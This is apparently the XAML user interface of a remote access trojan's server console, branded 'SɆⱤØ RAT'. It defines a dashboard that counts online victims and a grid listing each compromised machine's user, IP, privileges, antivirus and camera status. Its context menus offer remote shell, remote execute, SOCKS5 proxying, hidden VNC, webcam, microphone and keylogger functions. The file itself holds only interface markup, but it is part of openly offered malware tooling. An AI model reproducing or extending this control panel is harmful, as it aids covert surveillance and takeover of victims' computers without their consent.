<Window x:Class="SeroServer.UI.ServerWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="SɆⱤØ RAT"
        Icon="/sero.ico"
        Width="1100" Height="720"
        MinWidth="900" MinHeight="540"
        WindowStartupLocation="CenterScreen"
        ResizeMode="CanResize"
        WindowStyle="None"
        UseLayoutRounding="True"
        RenderOptions.ClearTypeHint="Enabled"
        AllowsTransparency="True"
        Background="Transparent"
        MouseLeftButtonDown="Window_MouseLeftButtonDown">

    <Window.Resources>
        <BooleanToVisibilityConverter x:Key="BoolToVis" />

        <Style TargetType="DataGridRow">
            <Setter Property="Background"      Value="Transparent" />
            <Setter Property="BorderThickness" Value="0" />
            <Setter Property="Foreground"      Value="#DDE0F0" />
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Background" Value="#0F1525" />
                </Trigger>
                <Trigger Property="IsSelected" Value="True">
                    <Setter Property="Background">
                        <Setter.Value>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                <GradientStop Color="#1A3D80" Offset="0"/>
                                <GradientStop Color="#0E1E40" Offset="0.45"/>
                                <GradientStop Color="#080D1A" Offset="1"/>
                            </LinearGradientBrush>
                        </Setter.Value>
                    </Setter>
                    <Setter Property="Foreground"      Value="#FFFFFF" />
                    <Setter Property="BorderBrush"     Value="#5A96FF" />
                    <Setter Property="BorderThickness" Value="3,1,1,1" />
                </Trigger>
                <MultiTrigger>
                    <MultiTrigger.Conditions>
                        <Condition Property="IsSelected"   Value="True" />
                        <Condition Property="IsMouseOver"  Value="True" />
                    </MultiTrigger.Conditions>
                    <Setter Property="Background">
                        <Setter.Value>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                <GradientStop Color="#224A96" Offset="0"/>
                                <GradientStop Color="#11224A" Offset="0.45"/>
                                <GradientStop Color="#0A0F20" Offset="1"/>
                            </LinearGradientBrush>
                        </Setter.Value>
                    </Setter>
                    <Setter Property="BorderBrush"     Value="#7AB0FF" />
                    <Setter Property="BorderThickness" Value="3,1,1,1" />
                </MultiTrigger>
            </Style.Triggers>
        </Style>

        <Style TargetType="DataGridCell">
            <Setter Property="BorderThickness" Value="0" />
            <Setter Property="Padding"         Value="0" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="DataGridCell">
                        <Border Background="{TemplateBinding Background}"
                                Padding="10,6" BorderThickness="0">
                            <ContentPresenter VerticalAlignment="Center" />
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <Trigger Property="IsSelected" Value="True">
                    <Setter Property="Background" Value="Transparent" />
                    <Setter Property="Foreground" Value="#C8CEFA" />
                </Trigger>
            </Style.Triggers>
        </Style>

        <Style TargetType="ContextMenu">
            <Setter Property="Background"      Value="#0F1020" />
            <Setter Property="BorderBrush"     Value="#1E2038" />
            <Setter Property="BorderThickness" Value="1" />
            <Setter Property="Foreground"      Value="#DDE0F0" />
            <Setter Property="Padding"         Value="4" />
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ContextMenu">
                        <Border Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
                                CornerRadius="10" Padding="4">
                            <Border.Effect>
                                <DropShadowEffect BlurRadius="28" ShadowDepth="8" Opacity="0.75" Color="#000000"/>
                            </Border.Effect>
                            <ItemsPresenter/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
        <Style TargetType="MenuItem">
            <Setter Property="Background" Value="Transparent"/>
            <Setter Property="Foreground" Value="#DDE0F0"/>
            <Setter Property="FontSize"   Value="12"/>
            <Setter Property="Cursor"     Value="Hand"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="MenuItem">
                        <Grid>
                            <!-- Item row -->
                            <Border x:Name="bd" Background="Transparent" CornerRadius="5" Margin="1,1">
                                <Grid>
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="28"/>
                                        <ColumnDefinition Width="*"/>
                                        <ColumnDefinition Width="16"/>
                                    </Grid.ColumnDefinitions>
                                    <ContentPresenter Grid.Column="0" ContentSource="Icon"
                                                      HorizontalAlignment="Center" VerticalAlignment="Center"
                                                      Margin="0,6,0,6"/>
                                    <ContentPresenter Grid.Column="1" ContentSource="Header"
                                                      Margin="2,7,4,7" VerticalAlignment="Center"/>
                                    <TextBlock x:Name="Arrow" Grid.Column="2" Text="›" FontSize="13"
                                               VerticalAlignment="Center" HorizontalAlignment="Center"
                                               Foreground="#505878" Visibility="Collapsed"/>
                                </Grid>
                            </Border>
                            <!-- Sub-menu popup (only rendered when item has children) -->
                            <Popup x:Name="PART_Popup"
                                   IsOpen="{Binding IsSubmenuOpen, RelativeSource={RelativeSource TemplatedParent}}"
                                   Placement="Right" HorizontalOffset="-2" VerticalOffset="-5"
                                   AllowsTransparency="True" Focusable="False" PopupAnimation="Fade">
                                <Border Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
                                        CornerRadius="8" Padding="4" MinWidth="168">
                                    <Border.Effect>
                                        <DropShadowEffect BlurRadius="22" ShadowDepth="6" Opacity="0.75" Color="#000"/>
                                    </Border.Effect>
                                    <ItemsPresenter KeyboardNavigation.TabNavigation="Cycle"
                                                    KeyboardNavigation.DirectionalNavigation="Cycle"/>
                                </Border>
                            </Popup>
                        </Grid>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsHighlighted" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#181B34"/>
                            </Trigger>
                            <Trigger Property="Role" Value="SubmenuHeader">
                                <Setter TargetName="Arrow" Property="Visibility" Value="Visible"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter Property="Opacity" Value="0.38"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>

    <!-- ── Window chrome ──────────────────────────────────────────── -->
    <Border x:Name="RootBorder" Background="#0C0D18" CornerRadius="8" BorderThickness="1"
            BorderBrush="#1C1E30">

        <Grid>
            <Grid.RowDefinitions>
                <RowDefinition Height="44" />
                <RowDefinition Height="3"  />
                <RowDefinition Height="Auto" />
                <RowDefinition Height="*"  />
                <RowDefinition Height="28" />
            </Grid.RowDefinitions>

            <!-- ── Background ─────────────────────────────────────────── -->
            <Grid Grid.RowSpan="5" IsHitTestVisible="False" ClipToBounds="True">

                <Rectangle Fill="#0C0D18"/>

                <!-- Logo watermark centré -->
                <Image x:Name="BgLogoImage"
                       Source="/serofondtransparent.png"
                       Width="460" Height="460"
                       HorizontalAlignment="Center" VerticalAlignment="Center"
                       Margin="0,55,0,0"
                       Opacity="0.52"
                       Stretch="Uniform"
                       RenderOptions.BitmapScalingMode="LowQuality"
                       RenderOptions.CachingHint="Cache">
                    <Image.Effect>
                        <BlurEffect x:Name="BgLogoBlur" Radius="2"/>
                    </Image.Effect>
                </Image>

            </Grid>

            <!-- ── Title bar ──────────────────────────────────────── -->
            <Border Grid.Row="0" Background="#C0111222" CornerRadius="10,10,0,0"
                    BorderThickness="0,0,0,1">
                <Border.BorderBrush>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#281E2038" Offset="0"/>
                        <GradientStop Color="#1E2038"   Offset="0.5"/>
                        <GradientStop Color="#281E2038" Offset="1"/>
                    </LinearGradientBrush>
                </Border.BorderBrush>
                <Grid Margin="14,0">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="Auto" />
                        <ColumnDefinition Width="*" />
                        <ColumnDefinition Width="Auto" />
                    </Grid.ColumnDefinitions>

                    <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                        <Image Source="/icone.png" Width="26" Height="26" Margin="0,0,9,0"
                               RenderOptions.BitmapScalingMode="HighQuality">
                            <Image.Clip>
                                <RectangleGeometry RadiusX="5" RadiusY="5" Rect="0,0,26,26" />
                            </Image.Clip>
                        </Image>
                        <TextBlock VerticalAlignment="Center" FontSize="14" FontWeight="Bold">
                            <Run Text="SɆⱤØ">
                                <Run.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="#4A85F5" Offset="0"/>
                                        <GradientStop Color="#7C5CE8" Offset="1"/>
                                    </LinearGradientBrush>
                                </Run.Foreground>
                            </Run>
                            <Run Text="RAT">
                                <Run.Foreground>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                        <GradientStop Color="#D8DCF0" Offset="0"/>
                                        <GradientStop Color="#8890B8" Offset="0.5"/>
                                        <GradientStop Color="#C4C8E0" Offset="1"/>
                                    </LinearGradientBrush>
                                </Run.Foreground>
                            </Run>
                        </TextBlock>
                    </StackPanel>

                    <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center" Margin="0,0,-2,0">
                        <Button Content="─" Width="32" Height="26" Style="{StaticResource SBtn}"
                                Click="Minimize_Click" Padding="0" FontSize="11" />
                        <Button x:Name="BtnFullscreen" Content="☐" Width="32" Height="26" Style="{StaticResource SBtn}"
                                Click="Fullscreen_Click" Padding="0" Margin="2,0,0,0" FontSize="11" />
                        <Button Content="✕" Width="32" Height="26" Style="{StaticResource SRedBtn}"
                                Click="Close_Click" Padding="0" Margin="2,0,0,0" FontSize="11" />
                    </StackPanel>
                </Grid>
            </Border>

            <!-- ── Accent line: full-width repeating aurora ─────────── -->
            <Rectangle x:Name="AuroraBar" Grid.Row="1" Height="3">
                <Rectangle.Fill>
                    <LinearGradientBrush MappingMode="Absolute"
                                         StartPoint="0,0" EndPoint="600,0"
                                         SpreadMethod="Repeat">
                        <LinearGradientBrush.Transform>
                            <TranslateTransform X="0"/>
                        </LinearGradientBrush.Transform>
                        <GradientStop Color="#4A85F5" Offset="0.00"/>
                        <GradientStop Color="#0DCCFF" Offset="0.20"/>
                        <GradientStop Color="#7C5CE8" Offset="0.42"/>
                        <GradientStop Color="#D040FF" Offset="0.58"/>
                        <GradientStop Color="#7C5CE8" Offset="0.76"/>
                        <GradientStop Color="#0DCCFF" Offset="0.90"/>
                        <GradientStop Color="#4A85F5" Offset="1.00"/>
                    </LinearGradientBrush>
                </Rectangle.Fill>
                <Rectangle.Triggers>
                    <EventTrigger RoutedEvent="Rectangle.Loaded">
                        <BeginStoryboard>
                            <Storyboard>
                                <DoubleAnimation
                                    Storyboard.TargetName="AuroraBar"
                                    Storyboard.TargetProperty="(Rectangle.Fill).(LinearGradientBrush.Transform).(TranslateTransform.X)"
                                    From="0" To="-600" Duration="0:0:5"
                                    RepeatBehavior="Forever"/>
                            </Storyboard>
                        </BeginStoryboard>
                    </EventTrigger>
                </Rectangle.Triggers>
            </Rectangle>

            <!-- ── Control bar ────────────────────────────────────── -->
            <Border Grid.Row="2" Background="#C0111222" Padding="16,8"
                    BorderThickness="0,0,0,1" BorderBrush="#181A2C">
                <Grid>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*" />
                        <ColumnDefinition Width="Auto" />
                        <ColumnDefinition Width="*" />
                    </Grid.ColumnDefinitions>

                    <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                        <TextBlock Text="PORT" Foreground="#606880" VerticalAlignment="Center"
                                   FontSize="10" FontWeight="SemiBold" Margin="0,0,8,0" />
                        <TextBox x:Name="TxtPort" Style="{StaticResource STxt}" Width="64" Text="7777" />
                        <Button x:Name="BtnStartStop" Content="START"
                                Style="{StaticResource SGreenBtn}" Click="StartStop_Click"
                                Width="80" Height="30" Margin="8,0,0,0" />
                    </StackPanel>

                    <!-- Status pill with pulsing dot -->
                    <Border Grid.Column="1" Background="#0D0E1A" CornerRadius="6" Padding="16,6"
                            BorderThickness="1" BorderBrush="#1C1E30"
                            VerticalAlignment="Center" HorizontalAlignment="Center">
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <Grid Width="16" Height="16" VerticalAlignment="Center" Margin="0,0,6,0">
                                <Ellipse x:Name="ServerPulse" Stroke="#EF4444" StrokeThickness="1.2"
                                         Fill="Transparent" Opacity="0" RenderTransformOrigin="0.5,0.5">
                                    <Ellipse.RenderTransform>
                                        <ScaleTransform x:Name="PulseScale"/>
                                    </Ellipse.RenderTransform>
                                </Ellipse>
                                <Ellipse x:Name="ServerDot" Width="7" Height="7" Fill="#EF4444"
                                         HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                <Grid.Triggers>
                                    <EventTrigger RoutedEvent="Grid.Loaded">
                                        <BeginStoryboard>
                                            <Storyboard RepeatBehavior="Forever">
                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
                                                                 Storyboard.TargetProperty="ScaleX"
                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
                                                                 Storyboard.TargetProperty="ScaleY"
                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
                                                <DoubleAnimation Storyboard.TargetName="ServerPulse"
                                                                 Storyboard.TargetProperty="Opacity"
                                                                 From="0.65" To="0.0" Duration="0:0:1.4"/>
                                            </Storyboard>
                                        </BeginStoryboard>
                                    </EventTrigger>
                                </Grid.Triggers>
                            </Grid>
                            <TextBlock x:Name="TxtServerStatus" Text="Stopped"
                                       Foreground="#606880" FontSize="12" />
                            <TextBlock x:Name="TxtClientCount" Text="  ·  0 clients"
                                       Foreground="#606880" FontSize="12" />
                        </StackPanel>
                    </Border>

                    <StackPanel Grid.Column="2" Orientation="Horizontal"
                                VerticalAlignment="Center" HorizontalAlignment="Right">
                        <Button Content="Backup" Style="{StaticResource SBtn}" Height="32" Padding="14,0"
                                Click="ExportBackup_Click" ToolTip="Export cert + auth key (.sero)" />
                        <Button Content="Import" Style="{StaticResource SBtn}" Height="32" Padding="14,0" Margin="6,0,0,0"
                                Click="ImportBackup_Click" ToolTip="Import .sero backup or .pfx cert" />
                    </StackPanel>
                </Grid>
            </Border>

            <!-- ── Tab control ────────────────────────────────────── -->
            <TabControl x:Name="MainTabControl" Grid.Row="3" Background="Transparent" BorderThickness="0"
                        Foreground="{StaticResource TextBrush}"
                        SelectionChanged="MainTabControl_SelectionChanged">
                <TabControl.Template>
                    <ControlTemplate TargetType="TabControl">
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <ScrollViewer Grid.Row="0"
                                          HorizontalScrollBarVisibility="Auto"
                                          VerticalScrollBarVisibility="Disabled"
                                          Background="#C0111222"
                                          Focusable="False">
                                <StackPanel Orientation="Horizontal"
                                            IsItemsHost="True"
                                            HorizontalAlignment="Center"/>
                            </ScrollViewer>
                            <Rectangle Grid.Row="1" Height="1">
                                <Rectangle.Fill>
                                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                        <GradientStop Color="Transparent" Offset="0"/>
                                        <GradientStop Color="#301E2038"   Offset="0.2"/>
                                        <GradientStop Color="#1E2038"     Offset="0.5"/>
                                        <GradientStop Color="#301E2038"   Offset="0.8"/>
                                        <GradientStop Color="Transparent" Offset="1"/>
                                    </LinearGradientBrush>
                                </Rectangle.Fill>
                            </Rectangle>
                            <ContentPresenter x:Name="PART_SelectedContentHost"
                                              Grid.Row="2"
                                              ContentSource="SelectedContent"
                                              ContentTemplate="{TemplateBinding SelectedContentTemplate}"
                                              ContentTemplateSelector="{TemplateBinding ContentTemplateSelector}"
                                              Margin="{TemplateBinding Padding}"/>
                        </Grid>
                    </ControlTemplate>
                </TabControl.Template>
                <TabControl.Resources>
                    <Style TargetType="TabItem">
                        <Setter Property="Foreground" Value="#606880" />
                        <Setter Property="Background" Value="Transparent" />
                        <Setter Property="Padding"    Value="14,10" />
                        <Setter Property="FontSize"   Value="12" />
                        <Setter Property="Template">
                            <Setter.Value>
                                <ControlTemplate TargetType="TabItem">
                                    <Grid x:Name="root" Cursor="Hand">
                                        <Border x:Name="bd" Background="Transparent"
                                                Padding="{TemplateBinding Padding}" />
                                        <ContentPresenter ContentSource="Header"
                                                          HorizontalAlignment="Center"
                                                          VerticalAlignment="Center"
                                                          Margin="{TemplateBinding Padding}" />
                                        <Rectangle x:Name="line" Height="3" VerticalAlignment="Bottom"
                                                   Visibility="Collapsed"
                                                   Fill="{StaticResource AccentBarBrush}" />
                                    </Grid>
                                    <ControlTemplate.Triggers>
                                        <Trigger Property="IsSelected" Value="True">
                                            <Setter Property="Foreground" Value="#EEF0FF" />
                                            <Setter TargetName="bd"   Property="Background"  Value="#181B30" />
                                            <Setter TargetName="line" Property="Visibility"  Value="Visible" />
                                        </Trigger>
                                        <MultiTrigger>
                                            <MultiTrigger.Conditions>
                                                <Condition Property="IsMouseOver" Value="True" />
                                                <Condition Property="IsSelected"  Value="False" />
                                            </MultiTrigger.Conditions>
                                            <Setter Property="Foreground" Value="#A0AACE" />
                                            <Setter TargetName="bd" Property="Background" Value="#10121E" />
                                        </MultiTrigger>
                                    </ControlTemplate.Triggers>
                                </ControlTemplate>
                            </Setter.Value>
                        </Setter>
                    </Style>
                </TabControl.Resources>

                <!-- ── Dashboard ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="▦" Foreground="#4A85F5" FontSize="10" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Dashboard"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="24" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <StackPanel>
                            <TextBlock Text="OVERVIEW" Style="{StaticResource SLabel}" Margin="0,0,0,20" />
                            <UniformGrid Columns="3">
                                <Border Background="#0A0D1A" CornerRadius="7" Padding="0,20"
                                        Margin="0,0,10,0" BorderThickness="1">
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                            <GradientStop Color="#4022C55E" Offset="0"/>
                                            <GradientStop Color="#0A22C55E" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                    <StackPanel HorizontalAlignment="Center">
                                        <TextBlock Text="ONLINE" Foreground="#8090B4" FontSize="10"
                                                   FontWeight="SemiBold" HorizontalAlignment="Center" />
                                        <TextBlock x:Name="DashOnline" Text="0" Foreground="#22C55E"
                                                   FontSize="38" FontWeight="Bold"
                                                   Margin="0,8,0,0" HorizontalAlignment="Center" />
                                    </StackPanel>
                                </Border>
                                <Border Background="#0A0D1A" CornerRadius="7" Padding="0,20"
                                        Margin="0,0,10,0" BorderThickness="1">
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                            <GradientStop Color="#404A85F5" Offset="0"/>
                                            <GradientStop Color="#0A4A85F5" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                    <StackPanel HorizontalAlignment="Center">
                                        <TextBlock Text="TOTAL SEEN" Foreground="#8090B4" FontSize="10"
                                                   FontWeight="SemiBold" HorizontalAlignment="Center" />
                                        <TextBlock x:Name="DashTotal" Text="0" Foreground="#4A85F5"
                                                   FontSize="38" FontWeight="Bold"
                                                   Margin="0,8,0,0" HorizontalAlignment="Center" />
                                    </StackPanel>
                                </Border>
                                <Border Background="#0A0D1A" CornerRadius="7" Padding="0,20"
                                        BorderThickness="1">
                                    <Border.BorderBrush>
                                        <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                            <GradientStop Color="#407C5CE8" Offset="0"/>
                                            <GradientStop Color="#0A7C5CE8" Offset="1"/>
                                        </LinearGradientBrush>
                                    </Border.BorderBrush>
                                    <StackPanel HorizontalAlignment="Center">
                                        <TextBlock Text="UPTIME" Foreground="#8090B4" FontSize="10"
                                                   FontWeight="SemiBold" HorizontalAlignment="Center" />
                                        <TextBlock x:Name="DashUptime" Text="--" Foreground="#7C5CE8"
                                                   FontSize="28" FontWeight="Bold"
                                                   Margin="0,12,0,0" HorizontalAlignment="Center" />
                                    </StackPanel>
                                </Border>
                            </UniformGrid>
                        </StackPanel>
                    </Border>
                </TabItem>

                <!-- ── Online ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="◉" Foreground="#22C55E" FontSize="10" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Online"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto" />
                                <RowDefinition Height="*" />
                            </Grid.RowDefinitions>

                            <Border Grid.Row="0" Background="#0D0E1A"
                                    BorderBrush="#1E2038" BorderThickness="0,0,0,1">
                                <Grid>
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="40" />
                                        <ColumnDefinition Width="*" />
                                    </Grid.ColumnDefinitions>
                                    <TextBlock Grid.Column="0" Text="⌕" FontSize="16"
                                               HorizontalAlignment="Center" VerticalAlignment="Center"
                                               Foreground="#606880" />
                                    <TextBox Grid.Column="1" x:Name="TxtSearch"
                                             Background="Transparent" Foreground="#DDE0F0"
                                             BorderThickness="0" Padding="0,9"
                                             FontSize="12" CaretBrush="#4A85F5" SelectionBrush="#4A85F5"
                                             VerticalContentAlignment="Center"
                                             TextChanged="TxtSearch_TextChanged"
                                             KeyDown="TxtSearch_KeyDown">
                                        <TextBox.Template>
                                            <ControlTemplate TargetType="TextBox">
                                                <Grid>
                                                    <TextBlock x:Name="Placeholder"
                                                               Text="Search  IP · ID · Tag · Machine · Country · Window..."
                                                               Foreground="#606880" FontSize="12"
                                                               VerticalAlignment="Center"
                                                               Visibility="Collapsed" IsHitTestVisible="False" />
                                                    <ScrollViewer x:Name="PART_ContentHost"
                                                                  Padding="0,9" VerticalAlignment="Center" />
                                                </Grid>
                                                <ControlTemplate.Triggers>
                                                    <Trigger Property="Text" Value="">
                                                        <Setter TargetName="Placeholder" Property="Visibility" Value="Visible" />
                                                    </Trigger>
                                                </ControlTemplate.Triggers>
                                            </ControlTemplate>
                                        </TextBox.Template>
                                    </TextBox>
                                </Grid>
                            </Border>

                            <DataGrid Grid.Row="1" x:Name="GridClients"
                                      AutoGenerateColumns="False" IsReadOnly="True"
                                      PreviewKeyDown="GridClients_PreviewKeyDown"
                                      Background="Transparent" Foreground="#DDE0F0"
                                      BorderThickness="0" RowBackground="Transparent"
                                      AlternatingRowBackground="#07101428"
                                      GridLinesVisibility="None" HeadersVisibility="Column"
                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
                                      VirtualizingStackPanel.IsVirtualizing="True"
                                      VirtualizingStackPanel.VirtualizationMode="Recycling"
                                      ScrollViewer.CanContentScroll="True"
                                      ScrollViewer.HorizontalScrollBarVisibility="Auto"
                                      ColumnHeaderStyle="{StaticResource SColHeader}">
                                <DataGrid.Columns>
                                    <DataGridTextColumn Header="ID"        Binding="{Binding Id}"                                 Width="68"  FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="TAG"       Binding="{Binding Tag}"                                Width="80"  />
                                    <DataGridTextColumn Header="USER"      Binding="{Binding Username}"                           Width="110" />
                                    <DataGridTextColumn Header="IP"        Binding="{Binding IP}"                                 Width="110" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="PRIV"      Binding="{Binding Privilege}"                          Width="52"  FontSize="11"/>
                                    <DataGridTextColumn Header="COUNTRY"   Binding="{Binding CountryDisplay}"                     Width="115" />
                                    <DataGridTextColumn Header="MACHINE"   Binding="{Binding MachineName}"                        Width="120" />
                                    <DataGridTextColumn Header="OS"        Binding="{Binding OS}"                                 Width="115" />
                                    <DataGridTextColumn Header="AV"        Binding="{Binding Antivirus}"                          Width="100" FontSize="11"/>
                                    <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding Payload}"                            Width="95"  FontSize="11"/>
                                    <DataGridTextColumn Header="1ST SEEN"  Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd}" Width="84"  FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="CPU"      Binding="{Binding CpuDisplay}"   Width="130" FontSize="11"/>
                                    <DataGridTextColumn Header="GPU"      Binding="{Binding GpuDisplay}"   Width="130" FontSize="11"/>
                                    <DataGridTextColumn Header="RAM"      Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="CAM"       Binding="{Binding CameraStatus}" Width="44"  FontSize="11"/>
                                    <DataGridTextColumn Header="WINDOW"    Binding="{Binding ActiveWindow}" Width="140" />
                                    <DataGridTemplateColumn Header="PING"  Width="70" MinWidth="50" SortMemberPath="PingMs">
                                        <DataGridTemplateColumn.CellTemplate>
                                            <DataTemplate>
                                                <TextBlock Text="{Binding PingDisplay}" Foreground="{Binding PingBrush}"
                                                           FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" Margin="10,0" />
                                            </DataTemplate>
                                        </DataGridTemplateColumn.CellTemplate>
                                    </DataGridTemplateColumn>
                                </DataGrid.Columns>
                                <DataGrid.ContextMenu>
                                    <ContextMenu>
                                        <!-- Administration -->
                                        <MenuItem Header="Administration">
                                            <MenuItem.Icon><TextBlock Text="&#x2630;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon>
                                            <MenuItem Header="Remote Shell"       Click="RemoteShell_Click">       <MenuItem.Icon><TextBlock Text="&gt;_" FontSize="10" FontFamily="Consolas" FontWeight="Bold" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="File Manager"       Click="FileManager_Click">       <MenuItem.Icon><TextBlock Text="&#x25A1;" FontSize="12" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Process Manager"    Click="ProcessManager_Click">    <MenuItem.Icon><TextBlock Text="&#x2699;" FontSize="11" Foreground="#4A85F5"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Startup Manager"    Click="StartupManager_Click">    <MenuItem.Icon><TextBlock Text="&#x25B6;" FontSize="10" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="TCP Connections"    Click="TcpManager_Click">        <MenuItem.Icon><TextBlock Text="&#x21C4;" FontSize="12" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Service Manager"    Click="ServiceManager_Click">    <MenuItem.Icon><TextBlock Text="&#x25D7;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Window Manager"     Click="WindowManager_Click">     <MenuItem.Icon><TextBlock Text="&#x2610;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Registry Editor"    Click="RegistryEditor_Click">    <MenuItem.Icon><TextBlock Text="&#x22EE;" FontSize="13" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Installed Programs" Click="InstalledApps_Click">     <MenuItem.Icon><TextBlock Text="&#x25A6;" FontSize="10" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Device Manager"     Click="DeviceManager_Click">     <MenuItem.Icon><TextBlock Text="&#x27F4;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="SOCKS5 Proxy"       Click="Socks5_Click">            <MenuItem.Icon><TextBlock Text="&#x21CC;" FontSize="12" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
                                            <MenuItem Header="Remote Execute"     Click="RemoteFileExec_Click">    <MenuItem.Icon><TextBlock Text="&#x26A1;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                        </MenuItem>
                                        <!-- Monitoring -->
                                        <MenuItem Header="Monitoring">
                                            <MenuItem.Icon><TextBlock Text="&#x25CE;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon>
                                            <MenuItem Header="Remote Desktop"      Click="RemoteDesktop_Click">       <MenuItem.Icon><TextBlock Text="&#x2B1B;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Webcam"              Click="RemoteWebcam_Click">        <MenuItem.Icon><TextBlock Text="&#x25D9;" FontSize="11" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="HVNC"                Click="Hvnc_Click">                <MenuItem.Icon><TextBlock Text="&#x25C9;" FontSize="11" Foreground="#7C5CE8"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Microphone"          Click="Microphone_Click">          <MenuItem.Icon><TextBlock Text="&#x25CF;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Keylogger"           Click="Keylogger_Click">           <MenuItem.Icon><TextBlock Text="&#x2395;" FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
